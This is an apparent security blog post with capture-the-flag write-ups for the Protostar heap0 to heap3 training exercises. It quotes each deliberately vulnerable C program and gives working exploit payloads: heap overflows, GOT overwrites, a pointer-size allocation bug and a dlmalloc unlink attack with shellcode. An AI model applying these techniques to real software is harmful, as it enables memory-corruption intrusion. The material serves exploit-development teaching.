+++
author = "pwntester"
categories = ["protostar", "heap0", "heap1", "heap2", "heap3", "heap4"]
date = 2013-12-20T09:32:00Z
description = ""
draft = false
slug = "protostar-heap0-4-write-ups"
tags = ["protostar", "heap0", "heap1", "heap2", "heap3", "heap4"]
title = "Protostar heap0-4 write-ups"

+++

## Heap0
In [Heap0](http://www.exploit-exercises.com/protostar/heap0) we are given the following vulnerable code:

```lang-clike line-numbers 
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>

struct data {
  char name[64];
};

struct fp {
  int (*fp)();
};

void winner()
{
  printf("level passed\n");
}

void nowinner()
{
  printf("level has not been passed\n");
}

int main(int argc, char **argv)
{
  struct data *d;
  struct fp *f;

  d = malloc(sizeof(struct data));
  f = malloc(sizeof(struct fp));
  f->fp = nowinner;

  printf("data is at %p, fp is at %p\n", d, f);

  strcpy(d->name, argv[1]);

  f->fp();

}
```

From a quick peek to the source code, we can see that our first argument can overflow the d->name buffer (64bytes) and so overwrite the f->fp pointer.

If we run the program with **ltrace** we will be able to analyze **malloc** calls:

```lang-bash line-numbers 
user@protostar:~$ ltrace /opt/protostar/bin/heap0 `perl -e 'print "A"*64'`
__libc_start_main(0x804848c, 2, 0xbffff874, 0x8048520, 0x8048510 <unfinished ...>
malloc(64)                                                                                    = 0x0804a008
malloc(4)                                                                                     = 0x0804a050
printf("data is at %p, fp is at %p\n", 0x804a008, 0x804a050data is at 0x804a008, fp is at 0x804a050
)                                  = 41
strcpy(0x0804a008, "0")                                                                       = 0x0804a008
puts("level has not been passed"level has not been passed
)                                                             = 26
+++ exited (status 26) +++
```

Ok, so the f->fp address is **0x0804a050** and the beginning of our d->data buffer is at **0x0804a008**. So if we fill d->data with 72 bytes  (0x0804a050 - 0x0804a008) the next 4 bytes will overwrite f->fp

```lang-bash line-numbers 
user@protostar:~$ gdb -q /opt/protostar/bin/heap0
Reading symbols from /opt/protostar/bin/heap0...done.
(gdb) run `perl -e 'print "A"x72 ."BBBB"'`
Starting program: /opt/protostar/bin/heap0 `perl -e 'print "A"x72 ."BBBB"'`
data is at 0x804a008, fp is at 0x804a050

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```

Nice!, lets use our winner address:

```lang-bash line-numbers 
user@protostar:~$ objdump -t /opt/protostar/bin/heap0 | grep winner
08048464 g     F .text	00000014              winner
08048478 g     F .text	00000014              nowinner
```

and ...

```lang-bash line-numbers 
user@protostar:~$ /opt/protostar/bin/heap0 `perl -e 'print "A"x72 ."\x64\x84\x04\x08"'`
data is at 0x804a008, fp is at 0x804a050
level passed
```

## Heap1
In [Heap1](http://www.exploit-exercises.com/protostar/heap1) we are given the following vulnerable code:

```lang-clike line-numbers 
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>



struct internet {
  int priority;
  char *name;
};

void winner()
{
  printf("and we have a winner @ %d\n", time(NULL));
}

int main(int argc, char **argv)
{
  struct internet *i1, *i2, *i3;

  i1 = malloc(sizeof(struct internet));
  i1->priority = 1;
  i1->name = malloc(8);

  i2 = malloc(sizeof(struct internet));
  i2->priority = 2;
  i2->name = malloc(8);

  strcpy(i1->name, argv[1]);
  strcpy(i2->name, argv[2]);

  printf("and that's a wrap folks!\n");
}
```

Ok, lets run a "lets be good guys" run with ltrace and expected arguments (8 bytes per name):

```lang-bash line-numbers 
user@protostar:~$ ltrace /opt/protostar/bin/heap1 AAAAAAAA BBBBBBBB
__libc_start_main(0x80484b9, 3, 0xbffff864, 0x8048580, 0x8048570 <unfinished ...>
malloc(8)                                                                                     = 0x0804a008
malloc(8)                                                                                     = 0x0804a018
malloc(8)                                                                                     = 0x0804a028
malloc(8)                                                                                     = 0x0804a038
strcpy(0x0804a018, "AAAAAAAA")                                                                = 0x0804a018
strcpy(0x0804a038, "BBBBBBBB")                                                                = 0x0804a038
puts("and that's a wrap folks!"and that's a wrap folks!
)                                                              = 25
+++ exited (status 25) +++
```

Lets make some sense of all those mallocs:

internet1 at 0x0804a008 (size 8)
--> internet1.priority at 0x0804a008 (size 4)
--> internet1.name at 0x0804a00c (size 4)
----> memory area pointed by internet1.name at 0x0804a018 (size 8)
internet2 at 0x0804a028 (size 8)
--> internet2.priority at 0x0804a028 (size 4)
--> internet2.name at 0x0804a02c (size 4)
----> memory area pointed by internet2.name at 0x0804a038 (size 8)

So with our A payload we could easily overwite internet2.priority, internet2.name and memory area pointed by internet2.name.
Our B payload will be written to the address stored in **internet2.name** by default this address points to the value returned by the last malloc call: 0x0804a038 but we can overwrite it with our A payload.
Thats pretty nice, we can write any arbitrary content (B payload) in any arbitrary address (controlled by A payload). All we have to do is replace the GOT entry for the **puts** call we saw in the ltrace output, so when it gets executed, we can execute another function instead.

Lets find **winner** address:

```lang-bash line-numbers 
user@protostar:~$ objdump -t /opt/protostar/bin/heap1 | grep winner
08048494 g     F .text	00000025              winner
```

and the **puts** entry in GOT:

```lang-bash line-numbers 
user@protostar:~$ objdump -TR /opt/protostar/bin/heap1 | grep puts
00000000      DF *UND*	00000000  GLIBC_2.0   puts
08049774 R_386_JUMP_SLOT   puts
```

And now lets do some maths and build our payload:

A payload: Ax(0x0804a02c - 0x0804a018) + "\x74\x97\x04\x08" = "A"x 20 . "\x74\x97\x04\x08"
B payload: "\x94\x84\x04\x08"

```lang-bash line-numbers 
user@protostar:~$ /opt/protostar/bin/heap1 `perl -e 'print "A"x20 ."\x74\x97\x04\x08"'` `perl -e 'print "\x94\x84\x04\x08"'`
and we have a winner @ 1387538886
```

Nice, lets check the internals with **ltrace**:

```lang-bash line-numbers 
user@protostar:~$ ltrace /opt/protostar/bin/heap1 `perl -e 'print "A"x20 ."\x74\x97\x04\x08"'` `perl -e 'print "\x94\x84\x04\x08"'`
__libc_start_main(0x80484b9, 3, 0xbffff854, 0x8048580, 0x8048570 <unfinished ...>
malloc(8)                                                                                     = 0x0804a008
malloc(8)                                                                                     = 0x0804a018
malloc(8)                                                                                     = 0x0804a028
malloc(8)                                                                                     = 0x0804a038
strcpy(0x0804a018, "AAAAAAAAAAAAAAAAAAAAt\227\004\b")                                         = 0x0804a018
strcpy(0x08049774, "\224\204\004\b")                                                          = 0x08049774
puts("and that's a wrap folks!" <unfinished ...>
time(NULL)                                                                                    = 1387538870
printf("and we have a winner @ %d\n", 1387538870and we have a winner @ 1387538870
)                                             = 34
<... puts resumed> )                                                                          = 34
+++ exited (status 34) +++
```

We can see that we sucessfully overwrote the strcpy destination address. Voila!!

## Heap2
In [Heap2](http://www.exploit-exercises.com/protostar/heap2) we are given the following vulnerable code:

```lang-clike line-numbers 
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

struct auth {
  char name[32];
  int auth;
};

struct auth *auth;
char *service;

int main(int argc, char **argv)
{
  char line[128];

  while(1) {
    printf("[ auth = %p, service = %p ]\n", auth, service);

    if(fgets(line, sizeof(line), stdin) == NULL) break;

    if(strncmp(line, "auth ", 5) == 0) {
      auth = malloc(sizeof(auth));
      memset(auth, 0, sizeof(auth));
      if(strlen(line + 5) < 31) {
        strcpy(auth->name, line + 5);
      }
    }
    if(strncmp(line, "reset", 5) == 0) {
      free(auth);
    }
    if(strncmp(line, "service", 6) == 0) {
      service = strdup(line + 7);
    }
    if(strncmp(line, "login", 5) == 0) {
      if(auth->auth) {
        printf("you have logged in already!\n");
      } else {
        printf("please enter your password\n");
      }
    }
  }
}
```

Ok, I have no clue where to begin with :) so I just run it on **ltrace** to see if I see something suspicious. I run "auth alvaro" and "service":

```lang-bash line-numbers 
user@protostar:~$ ltrace /opt/protostar/bin/heap2
__libc_start_main(0x8048934, 1, 0xbffff874, 0x804acc0, 0x804acb0 <unfinished ...>
printf("[ auth = %p, service = %p ]\n", (nil), (nil)[ auth = (nil), service = (nil) ]
)                                         = 34
fgets(auth alvaro
"auth alvaro\n", 128, 0xb7fd8420)                                                       = 0xbffff740
strncmp("auth alvaro\n", "auth ", 5)                                                          = 0
sysconf(30, 0, 0xb7fe1b28, 1, 0)                                                              = 4096
sbrk(4096)                                                                                    = 0x0804c000
sbrk(0)                                                                                       = 0x0804d000
memset(0x0804c008, '\000', 4)                                                                 = 0x0804c008
strlen("alvaro\n")                                                                            = 7
strcpy(0x0804c008, "alvaro\n")                                                                = 0x0804c008
strncmp("auth alvaro\n", "reset", 5)                                                          = -17
strncmp("auth alvaro\n", "service", 6)                                                        = -18
strncmp("auth alvaro\n", "login", 5)                                                          = -11
printf("[ auth = %p, service = %p ]\n", 0x804c008, (nil)[ auth = 0x804c008, service = (nil) ]
)                                     = 38
fgets(service
"service\n", 128, 0xb7fd8420)                                                           = 0xbffff740
strncmp("service\n", "auth ", 5)                                                              = 18
strncmp("service\n", "reset", 5)                                                              = 1
strncmp("service\n", "service", 6)                                                            = 0
strdup("\n")                                                                                  = 0x0804c018
strncmp("service\n", "login", 5)                                                              = 7
printf("[ auth = %p, service = %p ]\n", 0x804c008, 0x804c018[ auth = 0x804c008, service = 0x804c018 ]
)                                 = 42
fgets(
```

Ok, first thing weird is that **memset** call is just for 4 bytes!! wait, the source is not allocating the size of the struct but the size of the pointer thats 4 bytes!
So we have a 4 bytes space in the heap containing the address of the auth pointer. This heap space is at 0x0804c008
Now the **strcpy(0x0804c008, "alvaro\n")** is not copying to auth struct but overwriting the struct address in the heap
From the output of the service command we can see that the argument to the service command is allocated at **0x804c018** that is 16 bytes above the auth space.

Now in the login bit of the program, we are using **auth->auth** but auth is not the struct is the pointer to the struct!! Anyway, the compiler will cast it to the struct and so it will look for the **auth** member 32 bytes above the beggining of the "struct" (really the address of the auth pointer address)

We can use the auth command argument to write the auth pointer address
We can use the service command argument to write anything to **0x804c018**

So we want to place anything but a 0 32 bytes above **0x804c008**. We cannot use the argument to the auth command since it is controlled but we can use the argument to the service command.
Writing any string longer than 16 bytes (auth int offset within the auth struct - **0x804c018** - **0x804c008**) will be enough

```lang-bash line-numbers 
user@protostar:~$ /opt/protostar/bin/heap2
[ auth = (nil), service = (nil) ]
auth alvaro
[ auth = 0x804c008, service = (nil) ]
service AAAAAAAAAAAAAAAAB
[ auth = 0x804c008, service = 0x804c018 ]
login
you have logged in already!
[ auth = 0x804c008, service = 0x804c018 ]
```

## Heap3
In [Heap3](http://www.exploit-exercises.com/protostar/heap3) we are given the following vulnerable code:

```lang-clike line-numbers 
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

void winner()
{
  printf("that wasn't too bad now, was it? @ %d\n", time(NULL));
}

int main(int argc, char **argv)
{
  char *a, *b, *c;

  a = malloc(32);
  b = malloc(32);
  c = malloc(32);

  strcpy(a, argv[1]);
  strcpy(b, argv[2]);
  strcpy(c, argv[3]);

  free(c);
  free(b);
  free(a);

  printf("dynamite failed?\n");
}
```

This example looks like a classic vulnerable **unlink** scenario where we can override a chunk of memory an fool free() to call unlink() on it but the memory chunks are freed in the reverse order and we will need to pay special attention.
I recommend you to get familiar with how the heap works and what happens once we call **free**. Some good references :

- [Vudo Malloc Tricks by MaXX](http://www.phrack.org/issues.html?issue=57&id=8&mode=txt)
- [Exploiting the Wilderness by Phantasmal Phantasmagoria](https://www.thc.org/root/docs/exploit_writing/Exploiting%20the%20wilderness.txt)
- [Exploiting the heap](http://www.win.tue.nl/~aeb/linux/hh/hh-11.html)


When **free(c)** is called, it will detect that the memory before ("b") is in use and the memory after is the **wilderness** (cool name, uh?) so it will just expand the wilderness to take "**c**"
When **free(b)** is called, it will detect the same scenario but there is a chance for us to fool free() into calling the **unlink** macro on the previous chunk of code.
The idea is that when freeing "**b**"" the free() algorithm will check if the chunk before "**b**"" is free and if so, it will unlink it and merge it with "**b**" and the wilderness. Otherwise, merging just "**b**" and the wilderness without checking "**a**" can lead to leave a free chunk just before the wilderness ... and that makes no sense.

So we need to fool free(b) into thinking that "**a**" is free so that free() will unlink it and merge it with the chunk being freed (**b**) before linking the merged block again into "**bin**".

In order to do that we will modify **b**'s headers so that:
size = anything with **PREV_IN_USE** not set and big enough to hold our payload

This way the free() algorithm will think that **a** is free but we cannot overwrite **a**'s headers to modify its **bk** and **fd** pointers and get arbitrary code execution :(
Lets see if we can fool free() again to unlink a different portion of memory (instead of "**a**").

In order to calculate "**a**" address, free() will use **b**'s prev_size so that:
&a = &b - b_prev_size

We can overwrite **b**'s prev_size and set a negative number like -4 so that free() will try to unlink &b-(-4) = &b + 4. All we need to do is placing a fake chunk there.

We need to write our fake *fd and *bk pointers at that offset (because &b does not point to the prev_size or size headers, but to the beggining of *fd). In order to redirect program execution we need to set his *fd and *bk in the following way (omiting how we get GOT and winner address since it has been shown on previous write-ups):

fd = (address to write on -12) = GOT entry for puts - 12 = 0x0804b128 - 12 = **0x0804b11c**
bk = (content to write on [fd + 12]) = &winner = **0x08048864**

Ok, now we have everything we needed, lets craft the argv payloads

argv[1]:
a_data + b_prev_size + b_size
"A"x32 + (-4) + (!PREV_IN_USE)
"A"x32 . "\xfc\xff\xff\xff" . "\xf0\xff\xff\xff"

argv[2]:
4bytes_offset + fake->fd + fake-bk
"BBBB" + 0x0804b11c + 0x08048864
"BBBB" . "\x1c\xb1\x04\x08" . "\x64\x88\x04\x08"

argv[2]:
c_data
"CCCC"

Payload:

```lang-bash line-numbers 
user@protostar:~$ /opt/protostar/bin/heap3 `python -c 'print "A"*32 + "\xfc\xff\xff\xff" + "\xfc\xff\xff\xff"'` `python -c 'print "BBBB" + "\x1c\xb1\x04\x08" + "\x64\x88\x04\x08"'` CCCC
Segmentation fault
```

Damn it!! Lets have a look with gdb:

```lang-bash line-numbers 
user@protostar:~$ gdb -q /opt/protostar/bin/heap3
Reading symbols from /opt/protostar/bin/heap3...done.
(gdb) run `python -c 'print "A"*32 + "\xfc\xff\xff\xff" + "\xfc\xff\xff\xff"'` `python -c 'print "BBBB" + "\x1c\xb1\x04\x08" + "\x64\x88\x04\x08"'` CCCC
Starting program: /opt/protostar/bin/heap3 `python -c 'print "A"*32 + "\xfc\xff\xff\xff" + "\xfc\xff\xff\xff"'` `python -c 'print "BBBB" + "\x1c\xb1\x04\x08" + "\x64\x88\x04\x08"'` CCCC

Program received signal SIGSEGV, Segmentation fault.
0x08049906 in free (mem=0x804c030) at common/malloc.c:3638
3638	common/malloc.c: No such file or directory.
	in common/malloc.c
(gdb) x/x 0x0804b128
0x804b128 <_GLOBAL_OFFSET_TABLE_+64>:	0x08048864
(gdb) p winner
$1 = {void (void)} 0x8048864 <winner>
```

As you can see we have successfully overwritten the GOT entry for **puts()** with the winner address but we have a segmentation fault within malloc.c

Lets try an alternative approach. Instead of jumping straight to the winner address, we will prepare a shellcode that will get there for us and we will place this shellcode in the first chunk.

Shellcode:
jmp 12
nop sled
push &winner
ret

or in opcodes:
\xeb\x0c\x90..\x90\xeb\x0c\x68\x64\x88\x04\x08\xc3

We want to jump 12 bytes because unlink will overwrite part of our shellcode.

```lang-bash line-numbers 
user@protostar:~$ /opt/protostar/bin/heap3 `python -c 'print "\xeb\x0c" + \x90"*18 + "\x68\x64\x88\x04\x08\xc3" + "A"*6 + "\xfc\xff\xff\xff" + "\xfc\xff\xff\xff"'` `python -c 'print "BBBB"+"\x1c\xb1\x04\x08"+"\x08\xc0\x04\x08"'` CCCC
that wasn't too bad now, was it? @ 1387564812
```

Wow, it worked!

If we set up a breakpoint in winner function, we can check that puts() GOT entry has been overwritten successfully:

```lang-bash line-numbers 
(gdb) b *winner
Breakpoint 1 at 0x8048864: file heap3/heap3.c, line 8.
(gdb) run `python -c 'print "\xeb\x0c" + "\x90"*18 + "\x68\x64\x88\x04\x08\xc3" + "A"*6 + "\xfc\xff\xff\xff" + "\xfc\xff\xff\xff"'` `python -c 'print "BBBB"+"\x1c\xb1\x04\x08"+"\x08\xc0\x04\x08"'` CCCC
Starting program: /opt/protostar/bin/heap3 `python -c 'print "\xeb\x0c" + "\x90"*18 + "\x68\x64\x88\x04\x08\xc3" + "A"*6 + "\xfc\xff\xff\xff" + "\xfc\xff\xff\xff"'` `python -c 'print "BBBB"+"\x1c\xb1\x04\x08"+"\x08\xc0\x04\x08"'` CCCC

Breakpoint 1, winner () at heap3/heap3.c:8
8	heap3/heap3.c: No such file or directory.
	in heap3/heap3.c
(gdb) x/x 0x0804b128
0x804b128 <_GLOBAL_OFFSET_TABLE_+64>:	0x0804c008
(gdb) x/20x 0x0804c008
0x804c008:	0x00000000	0x90909090	0x0804b11c	0x90909090
0x804c018:	0x90909090	0x04886468	0x4141c308	0xfffffff8
0x804c028:	0xfffffffc	0xfffffffc	0xfffffff9	0x0804b194
0x804c038:	0x0804b194	0x00000000	0x00000000	0x00000000
0x804c048:	0x00000000	0x00000000	0x00000000	0x00000fb1
```

We can also see that part of our NOP sled has been overwritten by **unlink()**

A great write up can be found [here](http://conceptofproof.wordpress.com/2013/11/19/protostar-heap3-walkthrough/)
